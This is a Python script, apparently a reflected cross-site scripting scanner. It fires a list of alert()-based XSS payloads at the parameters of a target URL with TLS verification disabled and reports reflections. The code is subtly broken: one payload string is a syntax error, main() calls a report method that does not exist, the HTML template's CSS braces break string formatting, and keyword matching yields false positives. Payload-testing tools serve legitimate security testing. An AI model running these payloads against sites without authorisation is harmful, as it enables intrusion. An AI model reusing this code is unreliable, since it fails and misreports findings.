#!/usr/bin/env python3
"""
Reflected XSS Scanner
A Python-based tool to detect reflected XSS vulnerabilities by injecting payloads
and analyzing HTTP responses for reflections.
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import json
import html
import re
from typing import List, Dict, Set, Tuple
import sys
from datetime import datetime

class PayloadGenerator:
    """Generates payloads for XSS injection based on detected or user-specified contexts."""
    
    def __init__(self):
        self.base_payloads = [
            '<script>alert("xss")</script>',
            '<img src=x onerror="alert(\'xss\')">',
            '"><script>alert("xss")</script>',
            '\\"onload=\\"alert(\\'xss\\')\\"',
            '<svg onload="alert(\'xss\')">',
            '<body onload="alert(\'xss\')">',
            '<iframe src="javascript:alert(\'xss\')">',
            '<input onfocus="alert(\'xss\')" autofocus>',
            '<marquee onstart="alert(\'xss\')">',
            '<details open ontoggle="alert(\'xss\')">',
        ]
    
    def generate_payloads(self, context: str = None) -> Dict[str, List[str]]:
        """
        Generate payloads based on injection context.
        Contexts: inside_tag, attribute, js_context, html_context
        """
        payloads = {
            'html_context': self.base_payloads,
            'attribute_value': [
                '" onmouseover="alert(\'xss\')" x="',
                '\' onclick=\'alert("xss")\' x=\'',
                '" autofocus onfocus="alert(\'xss\')" x="',
            ],
            'tag_name': [
                '><img src=x onerror="alert(\'xss\')">',
                '><svg onload="alert(\'xss\')">',
            ],
            'js_context': [
                '"; alert("xss"); //',
                '\'); alert("xss"); //',
                '\' + alert("xss") + \'',
            ]
        }
        
        if context and context in payloads:
            return {context: payloads[context]}
        return payloads
    
    def get_all_payloads(self) -> List[str]:
        """Get all available payloads flattened."""
        all_payloads = []
        for payload_list in self.generate_payloads().values():
            all_payloads.extend(payload_list)
        return all_payloads


class ReflectionDetector:
    """Detects reflections in HTTP responses."""
    
    def __init__(self):
        self.reflection_patterns = []
    
    def detect_reflection(self, payload: str, response_text: str, 
                         context_info: Dict = None) -> bool:
        """
        Detect if payload is reflected in response.
        Handles simple substring match and HTML entity encoding.
        """
        # Direct reflection
        if payload in response_text:
            return True
        
        # HTML entity encoded reflection
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            return True
        
        # Double encoded
        double_encoded = html.escape(encoded_payload)
        if double_encoded in response_text:
            return True
        
        # Check for partial reflections
        dangerous_parts = ['alert', 'onerror', 'onload', 'onclick', 'onfocus', 'javascript:']
        for part in dangerous_parts:
            if part in payload and part in response_text:
                return True
        
        return False
    
    def get_reflection_context(self, payload: str, response_text: str) -> str:
        """Determine the context where reflection occurs."""
        if payload in response_text:
            idx = response_text.find(payload)
            start = max(0, idx - 50)
            end = min(len(response_text), idx + len(payload) + 50)
            context = response_text[start:end]
            
            if '<!--' in context:
                return 'html_comment'
            elif '<script' in context:
                return 'js_context'
            elif 'on' in context and '=' in context:
                return 'attribute_value'
            elif '<' in context and '>' in context:
                return 'inside_tag'
            
        return 'unknown'


class XSSScanner:
    """Main XSS Scanner class."""
    
    def __init__(self, timeout: int = 10, max_contexts: int = 23):
        self.session = requests.Session()
        self.timeout = timeout
        self.max_contexts = max_contexts
        self.payload_gen = PayloadGenerator()
        self.reflection_detector = ReflectionDetector()
        self.scanned_urls = set()
        self.vulnerabilities = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Flatten parameter dict
        flat_params = {}
        for key, value_list in params.items():
            flat_params[key] = value_list[0] if value_list else ''
        
        return flat_params
    
    def inject_payload(self, url: str, param_name: str, payload: str, 
                      method: str = 'GET') -> Tuple[bool, str, str]:
        """
        Inject payload into parameter and send request.
        Returns (success, response_text, reflection_context)
        """
        try:
            params = self.extract_parameters(url)
            
            if param_name not in params:
                params[param_name] = payload
            else:
                params[param_name] = payload
            
            # Reconstruct URL
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            if method.upper() == 'GET':
                response = self.session.get(
                    base_url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
            else:
                response = self.session.post(
                    base_url,
                    data=params,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False
                )
            
            reflected = self.reflection_detector.detect_reflection(payload, response.text)
            context = self.reflection_detector.get_reflection_context(payload, response.text)
            
            return reflected, response.text, context
        
        except Exception as e:
            return False, str(e), 'error'
    
    def scan_url(self, url: str, param_names: List[str] = None, 
                methods: List[str] = None) -> List[Dict]:
        """
        Scan a URL for XSS vulnerabilities.
        
        Args:
            url: Target URL
            param_names: Specific parameter names to test
            methods: HTTP methods to test
        
        Returns:
            List of vulnerabilities found
        """
        if url in self.scanned_urls:
            return []
        
        self.scanned_urls.add(url)
        vulnerabilities = []
        methods = methods or ['GET', 'POST']
        
        if param_names is None:
            param_names = list(self.extract_parameters(url).keys())
            if not param_names:
                param_names = ['q', 'search', 'id', 'page', 'user', 'name']
        
        payloads = self.payload_gen.get_all_payloads()
        
        print(f"\n[*] Scanning: {url}")
        print(f"[*] Parameters: {param_names}")
        print(f"[*] Methods: {methods}")
        print(f"[*] Payloads to test: {len(payloads)}")
        
        context_count = 0
        
        for method in methods:
            for param in param_names:
                for payload in payloads:
                    if context_count >= self.max_contexts:
                        break
                    
                    reflected, response, context = self.inject_payload(
                        url, param, payload, method
                    )
                    
                    if reflected:
                        context_count += 1
                        vuln = {
                            'url': url,
                            'parameter': param,
                            'method': method,
                            'payload': payload,
                            'context': context,
                            'timestamp': datetime.now().isoformat()
                        }
                        vulnerabilities.append(vuln)
                        self.vulnerabilities.append(vuln)
                        
                        print(f"  [!] XSS found in {param} ({method}): {context}")
                
                if context_count >= self.max_contexts:
                    break
            
            if context_count >= self.max_contexts:
                break
        
        if not vulnerabilities:
            print(f"  [+] No XSS vulnerabilities found")
        
        return vulnerabilities
    
    def generate_report(self, output_format: str = 'html') -> str:
        """
        Generate reflection report.
        Formats: html, terminal
        """
        if output_format == 'html':
            return self._generate_html_report()
        else:
            return self._generate_terminal_report()
    
    def _generate_html_report(self) -> str:
        """Generate HTML report."""
        html_template = """<!DOCTYPE html>
<html>
<head>
    <title>XSS Scanner Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .header { background: #333; color: white; padding: 20px; border-radius: 5px; }
        .summary { background: white; padding: 15px; margin: 20px 0; border-radius: 5px; }
        .vulnerability { background: #ffebee; border-left: 4px solid #d32f2f; padding: 15px; margin: 10px 0; }
        .clean { background: #e8f5e9; border-left: 4px solid #388e3c; padding: 15px; margin: 10px 0; }
        code { background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background: #f0f0f0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>XSS Scanner Report</h1>
        <p>Generated: {timestamp}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total URLs Scanned:</strong> {total_urls}</p>
        <p><strong>Vulnerabilities Found:</strong> {total_vulns}</p>
    </div>
    
    {vulns_section}
    
</body>
</html>"""
        
        vulns_section = ""
        if self.vulnerabilities:
            vulns_section = "<h2>Vulnerabilities</h2>"
            for vuln in self.vulnerabilities:
                vulns_section += f"""
    <div class="vulnerability">
        <h3>XSS in {vuln['parameter']} ({vuln['method']})</h3>
        <p><strong>URL:</strong> {vuln['url']}</p>
        <p><strong>Context:</strong> {vuln['context']}</p>
        <p><strong>Payload:</strong> <code>{html.escape(vuln['payload'])}</code></p>
        <p><strong>Found At:</strong> {vuln['timestamp']}</p>
    </div>"""
        else:
            vulns_section = '<div class="clean"><h3>Check passed: No XSS vulnerabilities detected</h3></div>'
        
        return html_template.format(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            total_urls=len(self.scanned_urls),
            total_vulns=len(self.vulnerabilities),
            vulns_section=vulns_section
        )
    
    def _generate_terminal_report(self) -> str:
        """Generate terminal report."""
        report = f"""
{'='*60}
XSS SCANNER REPORT
{'='*60}

Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

SUMMARY:
--------
Total URLs Scanned: {len(self.scanned_urls)}
Vulnerabilities Found: {len(self.vulnerabilities)}

"""
        
        if self.vulnerabilities:
            report += "VULNERABILITIES:\n"
            report += "-" * 60 + "\n"
            for i, vuln in enumerate(self.vulnerabilities, 1):
                report += f"""
{i}. Parameter: {vuln['parameter']}
   Method: {vuln['method']}
   URL: {vuln['url']}
   Context: {vuln['context']}
   Payload: {vuln['payload']}
   Timestamp: {vuln['timestamp']}
"""
        else:
            report += "Check passed: No XSS vulnerabilities detected\n"
        
        report += "\n" + "="*60 + "\n"
        return report


def main():
    """Main execution function."""
    if len(sys.argv) < 2:
        print("Usage: python xss_scanner.py <target_url> [parameters] [methods]")
        print("Example: python xss_scanner.py http://example.com/search?q=test q id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param_names = sys.argv[2].split(',') if len(sys.argv) > 2 else None
    methods = sys.argv[3].split(',') if len(sys.argv) > 3 else ['GET', 'POST']
    
    scanner = XSSScanner(max_contexts=23)
    
    # Disable SSL warnings for testing
    requests.packages.urllib3.disable_warnings()
    
    # Scan the URL
    vulnerabilities = scanner.scan_url(target_url, param_names, methods)
    
    # Generate and display reports
    print(scanner.generate_terminal_report())
    
    # Save HTML report
    html_report = scanner.generate_report('html')
    with open('xss_scan_report.html', 'w') as f:
        f.write(html_report)
    print("[+] HTML report saved to: xss_scan_report.html")


if __name__ == "__main__":
    main()